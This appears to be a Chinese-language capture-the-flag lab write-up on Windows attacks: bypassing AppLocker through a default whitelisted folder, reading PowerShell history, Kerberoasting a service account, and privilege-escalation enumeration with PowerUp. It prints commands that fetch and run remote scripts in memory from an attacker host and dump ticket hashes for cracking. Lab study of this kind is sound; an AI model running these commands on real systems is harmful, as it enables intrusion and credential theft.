0x02 绕过Applocker

AppLocker 是 Windows 7 中引入的应用程序白名单技术。它允许根据程序路径、发布者和哈希来限制用户可以执行哪些程序。

您会注意到，在部署的计算机上，您无法执行二进制文件，并且系统上的某些功能将受到限制。

有很多方法可以绕过 AppLocker。

如果 AppLocker 配置了默认的 AppLocker 规则，我们可以通过将可执行文件放置在以下目录中来绕过它：

C:\Windows\System32\spool\drivers\color //默认情况下该目录已列入白名单

继续使用 PowerShell 在本地下载您选择的可执行文件，将其放入白名单目录中并执行。

就像 Linux bash 一样，Windows Powershell 将所有以前的命令保存到名为 ConsoleHost_history 的文件中。它位于

%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

访问该文件并获取标志。

这里尝试直接在cmd中输入指定目录，发现直接就可以读取

当然也可以使用我们上一次学习过的powershell命令来进行

Get-Content %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

0x03 Kerberoasting

为了了解如何利用它，了解 Kerberous 的实际工作原理非常重要。请自行学习

Kerberos 是 Windows 和 Active Directory 网络的身份验证系统。针对 Kerberos 的攻击有很多，在这个房间中，我们将使用 Powershell 脚本来请求帐户的服务票证并获取票证哈希值。然后我们可以破解这个哈希值来访问另一个用户帐户！

我们先来列举一下Windows。如果我们运行 setspn -T medin -Q */* 我们可以提取 SPN 中的所有帐户。

SPN是服务主体名称，是服务和帐户之间的映射。

运行该命令，我们会找到一个现有的 SPN。这是给什么用户用的？（可以看到这里是fela用户）

现在我们已经看到用户有一个 SPN，我们可以使用 Invoke-Kerberoast 并获取票证。

我们首先下载 Powershell Invoke-Kerberoast

powershell -ep bypass;iex(New-Object Net.WebClient).DownloadString('http://10.14.79.125:81/Kerberoast.ps1')

现在让我们将其加载到内存中：

Invoke-Kerberoast -OutputFormat hashcat |fl

您应该获得 SPN 票证。

0x04 权限提升

我们将使用 PowerShell 枚举脚本来检查 Windows 计算机。然后我们可以确定获得管理员访问权限的最佳方式。

我们将在内存中运行 PowerUp1.ps1，以枚举滥用本地权限升级的任何弱点.

powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('http://10.14.79.125:81/PowerUp1.ps1')

该脚本确定了几种获得管理员访问权限的方法。第一个是绕过UAC，第二个是无人值守路径。我们将利用 UnattendedPath 方式。
